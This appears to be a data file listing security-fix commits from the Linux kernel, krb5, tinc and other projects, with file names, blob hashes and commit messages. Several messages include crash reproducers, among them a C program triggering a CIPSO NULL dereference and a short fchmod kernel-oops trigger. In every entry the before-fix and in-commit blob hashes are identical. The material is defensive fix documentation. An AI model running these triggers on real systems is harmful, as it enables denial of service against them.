vfs: make AIO use the proper rw_verify_area() area helpers\n\nWe had for some reason overlooked the AIO interface, and it didn't use the proper rw_verify_area() helper function that checks (for example) mandatory locking on the file, and that the size of the access doesn't cause us to overflow the provided offset limits etc.\n\nInstead, AIO did just the security_file_permission() thing (that rw_verify_area() also does) directly.\n\nThis fixes it to do all the proper helper functions, which not only means that now mandatory file locking works with AIO too, we can actually remove lines of code.\n\nReported-by: Manish Honap <manish_honap_vit@yahoo.co.in> Cc: stable@vger.kernel.org Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    b35cc8225845112a616e3a2266d2fde5ab13d3ab
File(s) In Commit: 
    sound/core/compress_offload.c
Blob(s) In Commit: 
    68fe02c7400a29c8b4584b45a44ed75205950b2b
Blob(s) Before Fix: 
    68fe02c7400a29c8b4584b45a44ed75205950b2b
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for b35cc8225845112a616e3a2266d2fde5ab13d3ab:
ALSA: compress_core: integer overflow in snd_compr_allocate_buffer()\n\nThese are 32 bit values that come from the user, we need to check for integer overflows or we could end up allocating a smaller buffer than expected.\n\nSigned-off-by: Dan Carpenter <dan.carpenter@oracle.com> Signed-off-by: Takashi Iwai <tiwai@suse.de>

======================================================================
Commit With Fix: 
    82981930125abfd39d7c8378a9cfdf5e1be2002b
File(s) In Commit: 
    net/core/sock.c
Blob(s) In Commit: 
    10605d2ec8606ad2860c88903aa2572bd914ab51
Blob(s) Before Fix: 
    10605d2ec8606ad2860c88903aa2572bd914ab51
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 82981930125abfd39d7c8378a9cfdf5e1be2002b:
net: cleanups in sock_setsockopt()\n\nUse min_t()/max_t() macros, reformat two comments, use !!test_bit() to match !!sock_flag()\n\nSigned-off-by: Eric Dumazet <edumazet@google.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    524465f70a32d0eb6bf047e6a05c76c22d52bfa2
File(s) In Commit: 
    port-proxy/bin/openshift-port-proxy-cfg
Blob(s) In Commit: 
    d9de32220a98f726074f8fc35b65e01df0cbc535
Blob(s) Before Fix: 
    d9de32220a98f726074f8fc35b65e01df0cbc535
Projects:
    2014cdag21_origin-server
Commit Message for 524465f70a32d0eb6bf047e6a05c76c22d52bfa2:
Cleanup

======================================================================
Commit With Fix: 
    22531545514043e04633e1c015c7540b9de9dbe4
File(s) In Commit: 
    libarchive/archive_write.c
Blob(s) In Commit: 
    be85621508d51df04ccedb3910cfe08e0dfa5b4f
Blob(s) Before Fix: 
    be85621508d51df04ccedb3910cfe08e0dfa5b4f
Projects:
    AasemShokr_libarchive
Commit Message for 22531545514043e04633e1c015c7540b9de9dbe4:
Limit write requests to at most INT_MAX. This prevents a certain common programming error (passing -1 to write) from leading to other problems deeper in the library.

======================================================================
Commit With Fix: 
    7d5145d8eb2b9791533ffe4dc003b129b9696c48
File(s) In Commit: 
    drivers/net/xen-netback/netback.c
Blob(s) In Commit: 
    bf692df966a9d7c7fecb18fbd0ea85c6be405e55
Blob(s) Before Fix: 
    bf692df966a9d7c7fecb18fbd0ea85c6be405e55
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 7d5145d8eb2b9791533ffe4dc003b129b9696c48:
xen/netback: don't leak pages on failure in xen_netbk_tx_check_gop.\n\nSigned-off-by: Matthew Daley <mattjd@gmail.com> Reviewed-by: Konrad Rzeszutek Wilk <konrad.wilk@oracle.com> Acked-by: Ian Campbell <ian.campbell@citrix.com> Acked-by: Jan Beulich <JBeulich@suse.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    13d2b4d11d69a92574a55bfd985cfb0ca77aebdc
File(s) In Commit: 
    arch/x86/xen/xen-asm_32.S
Blob(s) In Commit: 
    33ca6e42a4caabb412350563a1f8349fd77b7789
Blob(s) Before Fix: 
    33ca6e42a4caabb412350563a1f8349fd77b7789
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 13d2b4d11d69a92574a55bfd985cfb0ca77aebdc:
x86/xen: don't assume %ds is usable in xen_iret for 32-bit PVOPS.\n\nThis fixes CVE-2013-0228 / XSA-42\n\nDrew Jones while working on CVE-2013-0190 found that that unprivileged guest user in 32bit PV guest can use to crash the > guest with the panic like this:\n\n------------- general protection fault: 0000 [#1] SMP last sysfs file: /sys/devices/vbd-51712/block/xvda/dev Modules linked in: sunrpc ipt_REJECT nf_conntrack_ipv4 nf_defrag_ipv4 iptable_filter ip_tables ip6t_REJECT nf_conntrack_ipv6 nf_defrag_ipv6 xt_state nf_conntrack ip6table_filter ip6_tables ipv6 xen_netfront ext4 mbcache jbd2 xen_blkfront dm_mirror dm_region_hash dm_log dm_mod [last unloaded: scsi_wait_scan]\n\nPid: 1250, comm: r Not tainted 2.6.32-356.el6.i686 #1 EIP: 0061:[<c0407462>] EFLAGS: 00010086 CPU: 0 EIP is at xen_iret+0x12/0x2b EAX: eb8d0000 EBX: 00000001 ECX: 08049860 EDX: 00000010 ESI: 00000000 EDI: 003d0f00 EBP: b77f8388 ESP: eb8d1fe0  DS: 0000 ES: 007b FS: 0000 GS: 00e0 SS: 0069 Process r (pid: 1250, ti=eb8d0000 task=c2953550 task.ti=eb8d0000) Stack:  00000000 0027f416 00000073 00000206 b77f8364 0000007b 00000000 00000000 Call Trace: Code: c3 8b 44 24 18 81 4c 24 38 00 02 00 00 8d 64 24 30 e9 03 00 00 00 8d 76 00 f7 44 24 08 00 00 02 80 75 33 50 b8 00 e0 ff ff 21 e0 <8b> 40 10 8b 04 85 a0 f6 ab c0 8b 80 0c b0 b3 c0 f6 44 24 0d 02 EIP: [<c0407462>] xen_iret+0x12/0x2b SS:ESP 0069:eb8d1fe0 general protection fault: 0000 [#2] ---[ end trace ab0d29a492dcd330 ]--- Kernel panic - not syncing: Fatal exception Pid: 1250, comm: r Tainted: G      D    --------------- 2.6.32-356.el6.i686 #1 Call Trace:  [<c08476df>] ? panic+0x6e/0x122  [<c084b63c>] ? oops_end+0xbc/0xd0  [<c084b260>] ? do_general_protection+0x0/0x210  [<c084a9b7>] ? error_code+0x73/ -------------\n\nPetr says: "  I've analysed the bug and I think that xen_iret() cannot cope with  mangled DS, in this case zeroed out (null selector/descriptor) by either  xen_failsafe_callback() or RESTORE_REGS because the corresponding LDT  entry was invalidated by the reproducer. "\n\nJan took a look at the preliminary patch and came up a fix that solves this problem:\n\n"This code gets called after all registers other than those handled by IRET got already restored, hence a null selector in %ds or a non-null one that got loaded from a code or read-only data descriptor would cause a kernel mode fault (with the potential of crashing the kernel as a whole, if panic_on_oops is set)."\n\nThe way to fix this is to realize that the we can only relay on the registers that IRET restores. The two that are guaranteed are the %cs and %ss as they are always fixed GDT selectors. Also they are inaccessible from user mode - so they cannot be altered. This is the approach taken in this patch.\n\nAnother alternative option suggested by Jan would be to relay on the subtle realization that using the %ebp or %esp relative references uses the %ss segment.  In which case we could switch from using %eax to %ebp and would not need the %ss over-rides. That would also require one extra instruction to compensate for the one place where the register is used as scaled index. However Andrew pointed out that is too subtle and if further work was to be done in this code-path it could escape folks attention and lead to accidents.\n\nReviewed-by: Petr Matousek <pmatouse@redhat.com> Reported-by: Petr Matousek <pmatouse@redhat.com> Reviewed-by: Andrew Cooper <andrew.cooper3@citrix.com> Signed-off-by: Jan Beulich <jbeulich@suse.com> Signed-off-by: Konrad Rzeszutek Wilk <konrad.wilk@oracle.com>

======================================================================
Commit With Fix: 
    2d746ee9083c184f1234d8fed311e89bdd1b39e5
File(s) In Commit: 
    src/flash/plupload/src/com/plupload/Plupload.as
Blob(s) In Commit: 
    2c4981f6550ef4668dfb9437bc62df9b54700735
Blob(s) Before Fix: 
    2c4981f6550ef4668dfb9437bc62df9b54700735
Projects:
    1165013968_plupload
Commit Message for 2d746ee9083c184f1234d8fed311e89bdd1b39e5:
Flash: Sanitize id (allow only letters, digits and underscore).

======================================================================
Commit With Fix: 
    b3f456a8ceefac6e9f2e9acc2ea0c159d412b595
File(s) In Commit: 
    exec/totemcrypto.c
Blob(s) In Commit: 
    90cbb248b5231c0b944c6517cea6ac600ab759e8
Blob(s) Before Fix: 
    90cbb248b5231c0b944c6517cea6ac600ab759e8
Projects:
    6779660_corosync
Commit Message for b3f456a8ceefac6e9f2e9acc2ea0c159d412b595:
totemcrypto: fix hmac key initialization\n\nSigned-off-by: Fabio M. Di Nitto <fdinitto@redhat.com> Reviewed-by: Jan Friesse <jfriesse@redhat.com>

======================================================================
Commit With Fix: 
    6f237e4c9fab649d3750482514f0fde76c56ab30
File(s) In Commit: 
    lib/rack/file.rb
Blob(s) In Commit: 
    ee58a1a71baf29031617dcd02fb0265e349c8830
Blob(s) Before Fix: 
    ee58a1a71baf29031617dcd02fb0265e349c8830
Projects:
    040mike_rack
Commit Message for 6f237e4c9fab649d3750482514f0fde76c56ab30:
Prevent symlink path traversals\n\n * Closes CVE-2013-0262

======================================================================
Commit With Fix: 
    7da792fbd40c0e6eae1ee093aa00e0b177bd2ebc
File(s) In Commit: 
    manifests/base.pp
Blob(s) In Commit: 
    dd00f734785eb5d9fe45fd6e770b6d1ff9b70e90
Blob(s) Before Fix: 
    dd00f734785eb5d9fe45fd6e770b6d1ff9b70e90
Projects:
    131_puppetlabs-apache
Commit Message for 7da792fbd40c0e6eae1ee093aa00e0b177bd2ebc:
Restrict permissions on cinder configuration\n\nPrior to this commit, the puppetlabs-cinder module applied the mode 0644 to the File[$::cinder::params::cinder_conf] resource which were too permissive. This commit explicitly sets the mode to 0600.

======================================================================
Commit With Fix: 
    c903f0456bc69176912dee6dd25c6a66ee1aed00
File(s) In Commit: 
    arch/x86/kernel/msr.c
Blob(s) In Commit: 
    4929502c1372db979d7e1b176b22a9981e8ec96e
Blob(s) Before Fix: 
    4929502c1372db979d7e1b176b22a9981e8ec96e
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for c903f0456bc69176912dee6dd25c6a66ee1aed00:
x86/msr: Add capabilities check\n\nAt the moment the MSR driver only relies upon file system checks. This means that anything as root with any capability set can write to MSRs. Historically that wasn't very interesting but on modern processors the MSRs are such that writing to them provides several ways to execute arbitary code in kernel space. Sample code and documentation on doing this is circulating and MSR attacks are used on Windows 64bit rootkits already.\n\nIn the Linux case you still need to be able to open the device file so the impact is fairly limited and reduces the security of some capability and security model based systems down towards that of a generic "root owns the box" setup.\n\nTherefore they should require CAP_SYS_RAWIO to prevent an elevation of capabilities. The impact of this is fairly minimal on most setups because they don't have heavy use of capabilities. Those using SELinux, SMACK or AppArmor rules might want to consider if their rulesets on the MSR driver could be tighter.\n\nSigned-off-by: Alan Cox <alan@linux.intel.com> Cc: Linus Torvalds <torvalds@linux-foundation.org> Cc: Andrew Morton <akpm@linux-foundation.org> Cc: Peter Zijlstra <a.p.zijlstra@chello.nl> Cc: Horses <stable@kernel.org> Signed-off-by: Ingo Molnar <mingo@kernel.org>

======================================================================
Commit With Fix: 
    77c1090f94d1b0b5186fb13a1b71b47b1343f87f
File(s) In Commit: 
    net/core/datagram.c
Blob(s) In Commit: 
    368f9c3f9dc6505e693f56066da6dcb19ec2ebd6
Blob(s) Before Fix: 
    368f9c3f9dc6505e693f56066da6dcb19ec2ebd6
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 77c1090f94d1b0b5186fb13a1b71b47b1343f87f:
net: fix infinite loop in __skb_recv_datagram()\n\nTommi was fuzzing with trinity and reported the following problem :\n\ncommit 3f518bf745 (datagram: Add offset argument to __skb_recv_datagram) missed that a raw socket receive queue can contain skbs with no payload.\n\nWe can loop in __skb_recv_datagram() with MSG_PEEK mode, because wait_for_packet() is not prepared to skip these skbs.\n\n[   83.541011] INFO: rcu_sched detected stalls on CPUs/tasks: {} (detected by 0, t=26002 jiffies, g=27673, c=27672, q=75) [   83.541011] INFO: Stall ended before state dump start [  108.067010] BUG: soft lockup - CPU#0 stuck for 22s! [trinity-child31:2847] ... [  108.067010] Call Trace: [  108.067010]  [<ffffffff818cc103>] __skb_recv_datagram+0x1a3/0x3b0 [  108.067010]  [<ffffffff818cc33d>] skb_recv_datagram+0x2d/0x30 [  108.067010]  [<ffffffff819ed43d>] rawv6_recvmsg+0xad/0x240 [  108.067010]  [<ffffffff818c4b04>] sock_common_recvmsg+0x34/0x50 [  108.067010]  [<ffffffff818bc8ec>] sock_recvmsg+0xbc/0xf0 [  108.067010]  [<ffffffff818bf31e>] sys_recvfrom+0xde/0x150 [  108.067010]  [<ffffffff81ca4329>] system_call_fastpath+0x16/0x1b\n\nReported-by: Tommi Rantala <tt.rantala@gmail.com> Tested-by: Tommi Rantala <tt.rantala@gmail.com> Signed-off-by: Eric Dumazet <edumazet@google.com> Cc: Pavel Emelyanov <xemul@parallels.com> Acked-by: Pavel Emelyanov <xemul@parallels.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    027ef6c87853b0a9df53175063028edb4950d476
File(s) In Commit: 
    arch/x86/include/asm/pgtable.h
Blob(s) In Commit: 
    a1f780d45f7628a741939ba65e0f711d0fce468b
Blob(s) Before Fix: 
    a1f780d45f7628a741939ba65e0f711d0fce468b
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 027ef6c87853b0a9df53175063028edb4950d476:
mm: thp: fix pmd_present for split_huge_page and PROT_NONE with THP\n\nIn many places !pmd_present has been converted to pmd_none.  For pmds that's equivalent and pmd_none is quicker so using pmd_none is better.\n\nHowever (unless we delete pmd_present) we should provide an accurate pmd_present too.  This will avoid the risk of code thinking the pmd is non present because it's under __split_huge_page_map, see the pmd_mknotpresent there and the comment above it.\n\nIf the page has been mprotected as PROT_NONE, it would also lead to a pmd_present false negative in the same way as the race with split_huge_page.\n\nBecause the PSE bit stays on at all times (both during split_huge_page and when the _PAGE_PROTNONE bit get set), we could only check for the PSE bit, but checking the PROTNONE bit too is still good to remember pmd_present must always keep PROT_NONE into account.\n\nThis explains a not reproducible BUG_ON that was seldom reported on the lists.\n\nThe same issue is in pmd_large, it would go wrong with both PROT_NONE and if it races with split_huge_page.\n\nSigned-off-by: Andrea Arcangeli <aarcange@redhat.com> Acked-by: Rik van Riel <riel@redhat.com> Cc: Johannes Weiner <jweiner@redhat.com> Cc: Hugh Dickins <hughd@google.com> Cc: Mel Gorman <mgorman@suse.de> Cc: <stable@vger.kernel.org> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    89d7ae34cdda4195809a5a987f697a517a2a3177
File(s) In Commit: 
    net/ipv4/cipso_ipv4.c
Blob(s) In Commit: 
    667c1d4ca9847c627127dc633e19c7c94f354188
Blob(s) Before Fix: 
    667c1d4ca9847c627127dc633e19c7c94f354188
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 89d7ae34cdda4195809a5a987f697a517a2a3177:
cipso: don't follow a NULL pointer when setsockopt() is called\n\nAs reported by Alan Cox, and verified by Lin Ming, when a user attempts to add a CIPSO option to a socket using the CIPSO_V4_TAG_LOCAL tag the kernel dies a terrible death when it attempts to follow a NULL pointer (the skb argument to cipso_v4_validate() is NULL when called via the setsockopt() syscall).\n\nThis patch fixes this by first checking to ensure that the skb is non-NULL before using it to find the incoming network interface.  In the unlikely case where the skb is NULL and the user attempts to add a CIPSO option with the _TAG_LOCAL tag we return an error as this is not something we want to allow.\n\nA simple reproducer, kindly supplied by Lin Ming, although you must have the CIPSO DOI #3 configure on the system first or you will be caught early in cipso_v4_validate():\n\n	#include <sys/types.h> 	#include <sys/socket.h> 	#include <linux/ip.h> 	#include <linux/in.h> 	#include <string.h>\n\n	struct local_tag { 		char type  		char length  		char info[4]  	} \n\n	struct cipso { 		char type  		char length  		char doi[4]  		struct local_tag local  	} \n\n	int main(int argc, char **argv) 	{ 		int sockfd  		struct cipso cipso = { 			.type = IPOPT_CIPSO, 			.length = sizeof(struct cipso), 			.local = { 				.type = 128, 				.length = sizeof(struct local_tag), 			}, 		} \n\n		memset(cipso.doi, 0, 4)  		cipso.doi[3] = 3 \n\n		sockfd = socket(AF_INET, SOCK_DGRAM, 0)  		#define SOL_IP 0 		setsockopt(sockfd, SOL_IP, IP_OPTIONS, 			&cipso, sizeof(struct cipso)) \n\n		return 0  	}\n\nCC: Lin Ming <mlin@ss.pku.edu.cn> Reported-by: Alan Cox <alan@lxorguk.ukuu.org.uk> Signed-off-by: Paul Moore <pmoore@redhat.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    bd97120fc3d1a11f3124c7c9ba1d91f51829eb85
File(s) In Commit: 
    drivers/vhost/vhost.c
Blob(s) In Commit: 
    dedaf81d8f36fd89a5258d9a21fd261401f6e0d9
Blob(s) Before Fix: 
    dedaf81d8f36fd89a5258d9a21fd261401f6e0d9
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for bd97120fc3d1a11f3124c7c9ba1d91f51829eb85:
vhost: fix length for cross region descriptor\n\nIf a single descriptor crosses a region, the second chunk length should be decremented by size translated so far, instead it includes the full descriptor length.\n\nSigned-off-by: Michael S. Tsirkin <mst@redhat.com> Acked-by: Jason Wang <jasowang@redhat.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    a67adb997419fb53540d4a4f79c6471c60bc69b6
File(s) In Commit: 
    security/integrity/evm/evm_crypto.c
Blob(s) In Commit: 
    7dd538ef5b8319e645465eb62294158f3dbe271a
Blob(s) Before Fix: 
    7dd538ef5b8319e645465eb62294158f3dbe271a
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for a67adb997419fb53540d4a4f79c6471c60bc69b6:
evm: checking if removexattr is not a NULL\n\nThe following lines of code produce a kernel oops.\n\nfd = socket(PF_FILE, SOCK_STREAM|SOCK_CLOEXEC|SOCK_NONBLOCK, 0)  fchmod(fd, 0666) \n\n[  139.922364] BUG: unable to handle kernel NULL pointer dereference at   (null) [  139.924982] IP: [<  (null)>]   (null) [  139.924982] *pde = 00000000 [  139.924982] Oops: 0000 [#5] SMP [  139.924982] Modules linked in: fuse dm_crypt dm_mod i2c_piix4 serio_raw evdev binfmt_misc button [  139.924982] Pid: 3070, comm: acpid Tainted: G      D      3.8.0-rc2-kds+ #465 Bochs Bochs [  139.924982] EIP: 0060:[<00000000>] EFLAGS: 00010246 CPU: 0 [  139.924982] EIP is at 0x0 [  139.924982] EAX: cf5ef000 EBX: cf5ef000 ECX: c143d600 EDX: c15225f2 [  139.924982] ESI: cf4d2a1c EDI: cf4d2a1c EBP: cc02df10 ESP: cc02dee4 [  139.924982]  DS: 007b ES: 007b FS: 00d8 GS: 0033 SS: 0068 [  139.924982] CR0: 80050033 CR2: 00000000 CR3: 0c059000 CR4: 000006d0 [  139.924982] DR0: 00000000 DR1: 00000000 DR2: 00000000 DR3: 00000000 [  139.924982] DR6: ffff0ff0 DR7: 00000400 [  139.924982] Process acpid (pid: 3070, ti=cc02c000 task=d7705340 task.ti=cc02c000) [  139.924982] Stack: [  139.924982]  c1203c88 00000000 cc02def4 cf4d2a1c ae21eefa 471b60d5 1083c1ba c26a5940 [  139.924982]  e891fb5e 00000041 00000004 cc02df1c c1203964 00000000 cc02df4c c10e20c3 [  139.924982]  00000002 00000000 00000000 22222222 c1ff2222 cf5ef000 00000000 d76efb08 [  139.924982] Call Trace: [  139.924982]  [<c1203c88>] ? evm_update_evmxattr+0x5b/0x62 [  139.924982]  [<c1203964>] evm_inode_post_setattr+0x22/0x26 [  139.924982]  [<c10e20c3>] notify_change+0x25f/0x281 [  139.924982]  [<c10cbf56>] chmod_common+0x59/0x76 [  139.924982]  [<c10e27a1>] ? put_unused_fd+0x33/0x33 [  139.924982]  [<c10cca09>] sys_fchmod+0x39/0x5c [  139.924982]  [<c13f4f30>] syscall_call+0x7/0xb [  139.924982] Code:  Bad EIP value.\n\nThis happens because sockets do not define the removexattr operation. Before removing the xattr, verify the removexattr function pointer is not NULL.\n\nSigned-off-by: Dmitry Kasatkin <dmitry.kasatkin@intel.com> Signed-off-by: Mimi Zohar <zohar@linux.vnet.ibm.com> Cc: stable@vger.kernel.org Signed-off-by: James Morris <james.l.morris@oracle.com>

======================================================================
Commit With Fix: 
    0a9ab9bdb3e891762553f667066190c1d22ad62b
File(s) In Commit: 
    net/bluetooth/hidp/core.c
Blob(s) In Commit: 
    a7352ff3fd1e7884c2fc43142fba9bc0033063b8
Blob(s) Before Fix: 
    a7352ff3fd1e7884c2fc43142fba9bc0033063b8
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 0a9ab9bdb3e891762553f667066190c1d22ad62b:
Bluetooth: Fix incorrect strncpy() in hidp_setup_hid()\n\nThe length parameter should be sizeof(req->name) - 1 because there is no guarantee that string provided by userspace will contain the trailing '\0'.\n\nCan be easily reproduced by manually setting req->name to 128 non-zero bytes prior to ioctl(HIDPCONNADD) and checking the device name setup on input subsystem:\n\n$ cat /sys/devices/pnp0/00\:04/tty/ttyS0/hci0/hci0\:1/input8/name AAAAAA[...]AAAAAAAAf0:af:f0:af:f0:af\n\n("f0:af:f0:af:f0:af" is the device bluetooth address, taken from "phys" field in struct hid_device due to overflow.)\n\nCc: stable@vger.kernel.org Signed-off-by: Anderson Lizardo <anderson.lizardo@openbossa.org> Acked-by: Marcel Holtmann <marcel@holtmann.org> Signed-off-by: Gustavo Padovan <gustavo.padovan@collabora.co.uk>

======================================================================
Commit With Fix: 
    40f1b4a5749a621cd27c5ca39900dbcf8701969d
File(s) In Commit: 
    include/tool/editing_page.php
Blob(s) In Commit: 
    f5dc3f15ea26690343ceddd4e09805bc9729460c
Blob(s) Before Fix: 
    f5dc3f15ea26690343ceddd4e09805bc9729460c
Projects:
    1008k_gpEasy-CMS
Commit Message for 40f1b4a5749a621cd27c5ca39900dbcf8701969d:
new_section vulnerability fixed

======================================================================
Commit With Fix: 
    2ca39528c01a933f6689cd6505ce65bd6d68a530
File(s) In Commit: 
    kernel/signal.c
Blob(s) In Commit: 
    43b0d4a1b7bace76e2dac9a87e2a2f6ab5efdf3e
Blob(s) Before Fix: 
    43b0d4a1b7bace76e2dac9a87e2a2f6ab5efdf3e
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 2ca39528c01a933f6689cd6505ce65bd6d68a530:
signal: always clear sa_restorer on execve\n\nWhen the new signal handlers are set up, the location of sa_restorer is not cleared, leaking a parent process's address space location to children.  This allows for a potential bypass of the parent's ASLR by examining the sa_restorer value returned when calling sigaction().\n\nBased on what should be considered "secret" about addresses, it only matters across the exec not the fork (since the VMAs haven't changed until the exec).  But since exec sets SIG_DFL and keeps sa_restorer, this is where it should be fixed.\n\nGiven the few uses of sa_restorer, a "set" function was not written since this would be the only use.  Instead, we use __ARCH_HAS_SA_RESTORER, as already done in other places.\n\nExample of the leak before applying this patch:\n\n  $ cat /proc/$$/maps   ...   7fb9f3083000-7fb9f3238000 r-xp 00000000 fd:01 404469 .../libc-2.15.so   ...   $ ./leak   ...   7f278bc74000-7f278be29000 r-xp 00000000 fd:01 404469 .../libc-2.15.so   ...   1 0 (nil) 0x7fb9f30b94a0   2 4000000 (nil) 0x7f278bcaa4a0   3 4000000 (nil) 0x7f278bcaa4a0   4 0 (nil) 0x7fb9f30b94a0   ...\n\n[akpm@linux-foundation.org: use SA_RESTORER for backportability] Signed-off-by: Kees Cook <keescook@chromium.org> Reported-by: Emese Revfy <re.emese@gmail.com> Cc: Emese Revfy <re.emese@gmail.com> Cc: PaX Team <pageexec@freemail.hu> Cc: Al Viro <viro@zeniv.linux.org.uk> Cc: Oleg Nesterov <oleg@redhat.com> Cc: "Eric W. Biederman" <ebiederm@xmission.com> Cc: Serge Hallyn <serge.hallyn@canonical.com> Cc: Julien Tinnes <jln@google.com> Cc: <stable@vger.kernel.org> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    f249555301940c6df3a2cdda13b56b5674eebc2e
File(s) In Commit: 
    src/plugins/preauth/pkinit/pkinit_crypto_openssl.c
Blob(s) In Commit: 
    390797a9c26cf8c44c19a7d0a92abe2d8172a717
Blob(s) Before Fix: 
    390797a9c26cf8c44c19a7d0a92abe2d8172a717
Projects:
    3van_krb5
Commit Message for f249555301940c6df3a2cdda13b56b5674eebc2e:
PKINIT null pointer deref [CVE-2013-1415]\n\nDon't dereference a null pointer when cleaning up.\n\nThe KDC plugin for PKINIT can dereference a null pointer when a malformed packet causes processing to terminate early, leading to a crash of the KDC process.  An attacker would need to have a valid PKINIT certificate or have observed a successful PKINIT authentication, or an unauthenticated attacker could execute the attack if anonymous PKINIT is enabled.\n\nCVSSv2 vector: AV:N/AC:M/Au:N/C:N/I:N/A:C/E:P/RL:O/RC:C\n\nThis is a minimal commit for pullup  style fixes in a followup. [kaduk@mit.edu: reformat and edit commit message]\n\n(cherry picked from commit c773d3c775e9b2d88bcdff5f8a8ba88d7ec4e8ed)\n\nticket: 7570 version_fixed: 1.11.1 status: resolved

======================================================================
Commit With Fix: 
    8ee70ec63931d1e38567905387ab9b1d45734d81
File(s) In Commit: 
    src/kdc/do_tgs_req.c
Blob(s) In Commit: 
    86496e94911f45c6802a8cae71affd0b0d001dab
Blob(s) Before Fix: 
    86496e94911f45c6802a8cae71affd0b0d001dab
Projects:
    3van_krb5
Commit Message for 8ee70ec63931d1e38567905387ab9b1d45734d81:
KDC TGS-REQ null deref [CVE-2013-1416]\n\nBy sending an unusual but valid TGS-REQ, an authenticated remote attacker can cause the KDC process to crash by dereferencing a null pointer.\n\nprep_reprocess_req() can cause a null pointer dereference when processing a service principal name.  Code in this function can inappropriately pass a null pointer to strlcpy().  Unmodified client software can trivially trigger this vulnerability, but the attacker must have already authenticated and received a valid Kerberos ticket.\n\nThe vulnerable code was introduced by the implementation of new service principal realm referral functionality in krb5-1.7, but was corrected as a side effect of the KDC refactoring in krb5-1.11.\n\nCVSSv2 vector: AV:N/AC:L/Au:S/C:N/I:N/A:C/E:H/RL:O/RC:C\n\nticket: 7600 (new) version_fixed: 1.10.5 status: resolved

======================================================================
Commit With Fix: 
    4c023ba43c16396f0d199e2df1cfa59b88b62acc
File(s) In Commit: 
    src/kdc/do_tgs_req.c
Blob(s) In Commit: 
    745a48e98449c6a298eb1c4190e3e661dd5e4813
Blob(s) Before Fix: 
    745a48e98449c6a298eb1c4190e3e661dd5e4813
Projects:
    3van_krb5
Commit Message for 4c023ba43c16396f0d199e2df1cfa59b88b62acc:
KDC null deref due to referrals [CVE-2013-1417]\n\nAn authenticated remote client can cause a KDC to crash by making a valid TGS-REQ to a KDC serving a realm with a single-component name. The process_tgs_req() function dereferences a null pointer because an unusual failure condition causes a helper function to return success.\n\nWhile attempting to provide cross-realm referrals for host-based service principals, the find_referral_tgs() function could return a TGS principal for a zero-length realm name (indicating that the hostname in the service principal has no known realm associated with it).\n\nSubsequently, the find_alternate_tgs() function would attempt to construct a path to this empty-string realm, and return success along with a null pointer in its output parameter.  This happens because krb5_walk_realm_tree() returns a list of length one when it attempts to construct a transit path between a single-component realm and the empty-string realm.  This list causes a loop in find_alternate_tgs() to iterate over zero elements, resulting in the unexpected output of a null pointer, which process_tgs_req() proceeds to dereference because there is no error condition.\n\nAdd an error condition to find_referral_tgs() when krb5_get_host_realm() returns an empty realm name.  Also add an error condition to find_alternate_tgs() to handle the length-one output from krb5_walk_realm_tree().\n\nThe vulnerable configuration is not likely to arise in practice. (Realm names that have a single component are likely to be test realms.)  Releases prior to krb5-1.11 are not vulnerable.\n\nThanks to Sol Jerome for reporting this problem.\n\nCVSSv2: AV:N/AC:M/Au:S/C:N/I:N/A:P/E:H/RL:O/RC:C\n\n(cherry picked from commit 3c7f1c21ffaaf6c90f1045f0f5440303c766acc0)\n\nticket: 7668 version_fixed: 1.11.4 status: resolved

======================================================================
Commit With Fix: 
    c2ccf4197f697c4ff143b8a786acdd875e70a89d
File(s) In Commit: 
    src/kdc/main.c
Blob(s) In Commit: 
    71606079659c1ae940d74770850e4ccfbc9d2f92
Blob(s) Before Fix: 
    71606079659c1ae940d74770850e4ccfbc9d2f92
Projects:
    3van_krb5
Commit Message for c2ccf4197f697c4ff143b8a786acdd875e70a89d:
Multi-realm KDC null deref [CVE-2013-1418]\n\nIf a KDC serves multiple realms, certain requests can cause setup_server_realm() to dereference a null pointer, crashing the KDC.\n\nCVSSv2: AV:N/AC:M/Au:N/C:N/I:N/A:P/E:POC/RL:OF/RC:C\n\nA related but more minor vulnerability requires authentication to exploit, and is only present if a third-party KDC database module can dereference a null pointer under certain conditions.\n\n(back ported from commit 5d2d9a1abe46a2c1a8614d4672d08d9d30a5f8bf)\n\nticket: 7757 (new) version_fixed: 1.10.7 status: resolved

======================================================================
Commit With Fix: 
    17a33dfd95b1a29e90db76414eb9622df9632320
File(s) In Commit: 
    src/net_packet.c
Blob(s) In Commit: 
    054679e9aa0c75bca437e96443336a21d7ee53e4
Blob(s) Before Fix: 
    054679e9aa0c75bca437e96443336a21d7ee53e4
Projects:
    2898594211_tinc
Commit Message for 17a33dfd95b1a29e90db76414eb9622df9632320:
Drop packets forwarded via TCP if they are too big (CVE-2013-1428).\n\nNormally all requests sent via the meta connections are checked so that they cannot be larger than the input buffer. However, when packets are forwarded via meta connections, they are copied into a packet buffer without checking whether it fits into it. Since the packet buffer is allocated on the stack, this in effect allows an authenticated remote node to cause a stack overflow.\n\nThis issue was found by Martin Schobert.

======================================================================
Commit With Fix: 
    7d58f870e8edc6597485dd1b80ea9fb78580190c
File(s) In Commit: 
    upload/index.php
Blob(s) In Commit: 
